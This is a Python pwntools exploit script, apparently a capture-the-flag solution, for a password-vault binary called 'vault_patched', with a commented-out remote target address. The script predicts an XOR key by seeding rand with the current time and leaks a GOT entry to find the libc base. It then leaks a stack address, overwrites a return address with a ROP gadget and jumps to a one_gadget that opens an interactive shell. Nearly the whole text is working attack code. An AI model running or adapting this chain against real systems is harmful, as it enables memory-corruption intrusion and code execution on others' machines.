#!/usr/bin/env python3

from pwn import *
from ctypes import cdll
exe = ELF("./vault_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
from time import time
c = cdll.LoadLibrary('libc.so.6')
context.binary = exe

r = process()
#r = remote('94.237.55.61',43698)

current_time = int(time())
c.srand(current_time)

# gdb.attach(r,gdbscript='''
#            brva 0x0000000000001464
#            brva 0x00000000000017D0
#            brva 0x0000000000001643
#            brva 0x0000000000001778
#            brva 0x000000000000130E
#            brva 0x000000000000183A
#            got -r
#            c
#            ''')

def from_r12(addr, key, offset=0, size=8, width=0xff):
    packed = pack(addr, size * 8)
    debug('packed: ' + packed.hex())
    xorred = xor(packed, key[offset:][:size]) + p8(key[offset + size])
    pw = b'a'*offset
    pw += xorred
    return pw.ljust(width, b'a')

def add_entry(pw):
    r.sendline(b'1')
    url = flat({0x80: b':'})
    r.sendline(url)
    r.sendline(pw)

def view_entry(idx):
    sleep(0.1)
    r.sendline(b'2')
    sleep(0.1)
    r.sendline(str(idx))

key = bytes(c.rand() & 0xff for i in range(0x40))
print("key: ",key.hex())
print(f"puts: {hex(exe.got.puts&0xffff)}")
payload = from_r12(exe.got.puts & 0xffff,key , 0 ,2)
input()
add_entry(payload)
view_entry(0)

input()
view_entry(0)
r.recvuntil(b'3. Exit\n')
r.recvuntil(b'3. Exit\n')
r.recvuntil(b'3. Exit\n')
r.recvuntil(b'3. Exit\n')
print("this is trash")
libc.address = u64(r.recv(6).ljust(8,b'\x00')) - 0x80e50
log.info(f'libc: {hex(libc.address)}')

payload2 = from_r12(libc.sym.__libc_argv, key, 0,6)


add_entry(payload2)
view_entry(1)
view_entry(1)
r.recvuntil(b'3. Exit\n')
r.recvuntil(b'3. Exit\n')
r.recvuntil(b'3. Exit\n')
print("this is trash")
stack_leak = u64(r.recv(6).ljust(8,b'\x00'))
log.info(f'stack_leak: {hex(stack_leak)}')
pop_rbx_r12_r13_rbp = 0x0000000000044d40 + libc.address

overwrite = pop_rbx_r12_r13_rbp
payload3 = from_r12(overwrite,key,0x20,6)
add_entry(payload3)

# return main -> tao new frame
input("overwrite")
view_entry(2)
input()
view_entry(2)
r.recvuntil(b'3. Exit\n')
r.recvuntil(b'3. Exit\n')
r.recvuntil(b'3. Exit\n')

# new frame -> main
input("check new key")
view_entry(0)
r.recvuntil('\nPassword:    ')
enc2 = r.recvuntil('\n1. ', drop=True)[:0x40]
enc1 = xor(payload[:0x40],key[:0x40])
key2 = xor(enc1,enc2)
print("new key: " + key2.hex())

payload4 = from_r12(libc.address+0xebd3f, key2, 0x20, 6)
input("one_gadget")
add_entry(payload4)
view_entry(3)

rbp_sub_0x70 = stack_leak - 0x70
payload5 = from_r12(rbp_sub_0x70, key2, 0, 6, 0xff - 8)      # pop rbx
input("rbp_sub")
add_entry(payload5)
view_entry(4)
view_entry(4)
r.recvuntil(b'3. Exit\n')
r.recvuntil(b'3. Exit\n')
r.recvuntil(b'3. Exit\n')

input('setup og')
# set up rdx
r.sendline(str((libc.address+0x21a1f0) & 0xffffffff))
input()
r.sendlineafter(b': ',str(3))   # index3



r.interactive()